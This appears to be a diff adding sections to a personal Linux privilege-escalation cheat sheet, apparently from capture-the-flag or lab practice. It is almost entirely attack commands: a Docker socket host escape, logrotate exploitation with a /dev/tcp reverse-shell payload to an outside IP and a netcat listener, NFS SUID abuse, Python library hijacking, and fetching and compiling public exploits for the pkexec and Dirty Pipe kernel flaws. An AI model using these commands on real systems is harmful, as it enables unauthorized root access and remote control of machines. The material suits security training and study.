@@ -213,3 +213,111 @@ find / -name flag.txt 2>/dev/null
 cat /tmp/root/root/flag.txt
 
 ```
+
+# Docker
+
+```bash
+
+find / -name docker.sock 2>/dev/null
+
+docker -H unix:///run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
+```
+
+# Logrotate
+
+writeup: https://www.youtube.com/watch?v=krklkDm3mDI
+
+```bash
+find / -name logrotate.conf 2>/dev/null
+
+git clone https://github.com/whotwagner/logrotten.git
+
+gcc logrotten.c -o logrotten
+
+echo 'bash -i >& /dev/tcp/10.10.14.110/4443 0>&1' > payload
+
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+nc -nlvp 9002
+
+./logrotten -p ./payload /tmp/tmp.log
+
+```
+
+# Miscellaneous Techniques
+
+```bash
+cat /etc/exports
+
+showmount -e 10.129.2.210
+
+sudo mount -t nfs 10.129.2.210:/tmp /mnt
+
+cp shell /mnt
+
+chmod u+s /mnt/shell
+
+```
+
+
+# Python Library Hijacking
+
+psuntil.py
+
+```python 
+#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system('cat /root/flag.txt')
+
+```
+
+```bash
+
+grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
+
+sudo /usr/bin/python3 ~/mem_status.py 
+
+```
+
+# Polkit
+
+pkexec - runs a program with the rights of another user or with root rights
+
+```bash
+
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+
+python3 -m http.server 8000
+
+wget http://10.10.14.42:8000/poc.c
+
+gcc -o poc poc.c
+
+```
+
+# Dirty Pipe
+
+- A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. 
+- All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability
+
+```bash
+
+uname -r
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+
+python3 -m http.server 8000
+
+wget http://10.10.14.42:8000/exploit-1.c
+
+gcc -o shell exploit-1.c
+
+
+```
+
+# skill
+
